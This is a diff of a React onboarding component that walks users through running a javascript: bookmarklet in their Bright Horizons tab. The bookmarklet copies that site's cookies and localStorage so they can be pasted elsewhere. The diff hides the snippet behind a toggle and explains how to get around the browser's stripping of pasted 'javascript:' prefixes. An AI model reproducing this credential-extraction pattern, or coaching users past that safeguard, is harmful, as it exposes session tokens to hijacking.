@@ -14,6 +14,7 @@ export const DesktopSessionStepper: React.FC<DesktopSessionStepperProps> = ({ on
   const [validationSuccess, setValidationSuccess] = useState<string | null>(null);
   const [submitting, setSubmitting] = useState<boolean>(false);
   const [parsedPayload, setParsedPayload] = useState<any>(null);
+  const [showSnippetCode, setShowSnippetCode] = useState<boolean>(false);
 
   const snippetCode = `javascript:(function(){var d={cookies:document.cookie,storage:JSON.stringify(localStorage)},s=JSON.stringify(d),o=document.getElementById("bh-session-overlay");if(o)o.remove();var b=document.createElement("div");b.id="bh-session-overlay";b.style.cssText="position:fixed;top:20px;right:20px;z-index:999999;width:420px;background:#1e293b;color:#fff;padding:16px;border-radius:12px;box-shadow:0 20px 25px -5px rgba(0,0,0,0.5);font-family:sans-serif;font-size:13px;";b.innerHTML='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><b style="color:#818cf8;">Bright Horizons Session Payload</b><button id="bh-close-btn" style="background:none;border:none;color:#94a3b8;cursor:pointer;font-size:16px;">✕</button></div><p style="margin:0 0 10px 0;font-size:11px;color:#cbd5e1;">Click below to copy your full session payload:</p><textarea id="bh-ta-payload" style="width:100%;height:140px;background:#0f172a;color:#fde047;border:1px solid #334155;border-radius:6px;padding:8px;font-family:monospace;font-size:10px;resize:none;" readonly></textarea><button id="bh-copy-btn" style="width:100%;margin-top:10px;padding:8px;background:#4f46e5;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">📋 Copy Session Payload</button>';document.body.appendChild(b);var t=document.getElementById("bh-ta-payload");t.value=s;t.select();document.getElementById("bh-close-btn").onclick=function(){b.remove();};document.getElementById("bh-copy-btn").onclick=function(){t.select();document.execCommand("copy");this.innerText="✓ Copied to Clipboard!";this.style.background="#10b981";};})();`;
 
@@ -216,21 +217,41 @@ export const DesktopSessionStepper: React.FC<DesktopSessionStepperProps> = ({ on
             <div className="bg-slate-50 border border-slate-200 rounded-xl p-6 space-y-4">
               <h3 className="text-sm font-semibold text-slate-900">1. Copy Session Extraction Code</h3>
               <p className="text-xs text-slate-600 leading-relaxed">
-                Copy the code below, switch to the Bright Horizons tab address bar, type <span className="font-mono text-indigo-700 bg-indigo-50 border border-indigo-100 px-1.5 py-0.5 rounded font-semibold">javascript:</span> and paste the copied code directly after it (without any space), then press Enter.
+                Click <strong>Copy Code</strong> below. Switch to your Bright Horizons browser tab address bar, type <span className="font-mono text-indigo-700 bg-indigo-50 border border-indigo-100 px-1.5 py-0.5 rounded font-semibold">javascript:</span> into the address bar, then paste the copied code directly after it and press Enter.
               </p>
 
-              <div className="relative bg-slate-900 border border-slate-800 rounded-xl p-4 font-mono text-xs text-amber-300 break-all space-y-3">
-                <div className="flex items-center justify-between border-b border-slate-800 pb-2 text-[10px] text-slate-400">
-                  <span>ADDRESS BAR SNIPPET</span>
+              <div className="relative bg-slate-900 border border-slate-800 rounded-xl p-3.5 font-mono text-xs">
+                <div className="flex items-center justify-between">
+                  <div className="flex items-center gap-2.5">
+                    <span className="text-[10px] font-bold tracking-wider uppercase text-slate-400">ADDRESS BAR SNIPPET</span>
+                    <button
+                      type="button"
+                      onClick={() => setShowSnippetCode(!showSnippetCode)}
+                      className="text-xs text-indigo-400 hover:text-indigo-300 font-sans font-medium transition"
+                    >
+                      {showSnippetCode ? 'Hide Code ▲' : 'Show Code ▼'}
+                    </button>
+                  </div>
                   <button
+                    type="button"
                     onClick={handleCopySnippet}
-                    className="flex items-center space-x-1 text-indigo-300 hover:text-white bg-indigo-600/30 border border-indigo-500/30 px-3 py-1 rounded-md transition-colors"
+                    className="flex items-center space-x-1.5 text-indigo-200 hover:text-white bg-indigo-600/40 hover:bg-indigo-600/70 border border-indigo-500/40 px-3 py-1.5 rounded-lg transition-colors font-sans text-xs font-semibold shadow-2xs"
                   >
                     {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                     <span>{copied ? 'Copied to Clipboard!' : 'Copy Code'}</span>
                   </button>
                 </div>
-                <p className="text-slate-200 select-all">{snippetCode}</p>
+
+                {showSnippetCode && (
+                  <div className="mt-3 pt-3 border-t border-slate-800 space-y-2">
+                    <p className="text-[11px] text-slate-400 font-sans leading-relaxed">
+                      💡 <strong>Why type <code className="text-amber-300 font-mono">javascript:</code> manually?</strong> Browsers automatically strip the leading <code className="text-amber-300 font-mono">javascript:</code> prefix when you paste into an address bar for security reasons. Typing <code className="text-amber-300 font-mono">javascript:</code> first ensures the code executes as a bookmarklet.
+                    </p>
+                    <p className="text-amber-300 text-[10px] break-all select-all font-mono bg-slate-950 p-3 rounded-lg border border-slate-800 max-h-36 overflow-y-auto leading-relaxed">
+                      {snippetCode}
+                    </p>
+                  </div>
+                )}
               </div>
             </div>
 
